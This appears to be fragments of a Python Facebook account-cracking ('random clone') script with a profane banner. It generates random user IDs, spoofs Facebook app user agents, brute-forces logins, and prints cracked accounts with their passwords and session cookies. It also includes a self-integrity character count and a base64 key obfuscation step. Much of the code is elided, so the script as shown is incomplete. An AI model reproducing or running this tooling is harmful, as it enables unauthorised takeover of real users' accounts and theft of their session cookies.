...
logo=f"""  
     [white]888888 88   88  dP""b8 88  dP [red]X
     [green]88__   88   88 dP   `" 88odP  
     [white]88""   Y8   8P Yb      88"Yb  
     [green]88     `YbodP'  YboodP 88  Yb [red]D
[red]{str('━'*38)}
[white][[green]-[white]][green] AUTHOR   :  FUCKER
[white][[green]-[white]][green] STATUS   :  RANDOM CLONE
[white][[green]-[white]][green] VERSION  :  [red]FUCK
[red]{str('━'*38)}"""
...
def ua():
    ...
    xx="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) MyCustomBrowser/3.2.1 Chrome/98.0.4758.102 Electron/16.0.0 Safari/537.36"
    return xx
...
def filex(uid,pwx,name,meth,fl):
    ...
    if meth in ["a","A","1"]:
        ...
        uax="Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/95.0.0.40.850;FBBV/4567890123;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/14.0;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]"
    elif meth in ["c","C","3"]:
...
def old():
    ...
    if ask in["1"]:
        ...
        star="1000"
        for i in range(limit):
            data=str(random.choice(range(10000000000,99999999999)))
            user.append(data)
...
#--------------------------------[UPDATED]------------------------#
def uoa():
    chrome_version = str(random.choice(range(80, 87)))
    safari_version = str(random.choice(range(7, 12)))
    os_version = str(random.choice(range(8, 15)))  # Adjust the range for Windows OS version
    return f"Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.141 Mobile/15E148 Safari/604.1 [FB_IAB/FB4A;FBAV/285.0.0.48.118;]" 
...
def rensub(uid,pwx,meth,fb,user):
    global oks,loop
    sys.stdout.write(f'\r•\033[0;37m[{random.choice(color)}FUCK-M{meth.upper()}\033[0;37m]-[\033[1;32m{loop}\033[1;91m|\033[0;37m{str(len(user))}\033[0;37m]-[\033[1;32mOK:{str(len(oks))}\033[0;37m]\r');sys.stdout.flush()
...
'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            ...
            if "c_user" in res:
                ...
                xd=xx[:15].replace(";","  ") 
                print(f"\r\r[b r green_yellow][FUCK-OK][/b r green_yellow][b chartreuse1]{xd}|{ps}|{coki}\n")
    ...
    for file in files:
        if file.endswith(".py"):
            with open(os.path.join(path, file), "r") as f:
                ...
                # Count alphabetic characters in each line
                for line in data:
                    for char in line:
                        if char.isalpha():
                            count += 1

    # Debugging: print final count
    print(f"Total alphabetic character count: {count}")

    # Check the count of alphabetic characters
    if count == 112778:
...
# Encode the num_key in base64
cm = num_key.encode("ASCII")
cmr = base64.b64encode(cm)

# Modify the base64 encoded string
cm2 = cmr.decode("ASCII").upper().replace("B", "BOKACHUDA")
showkey = cm2.replace("=", "")
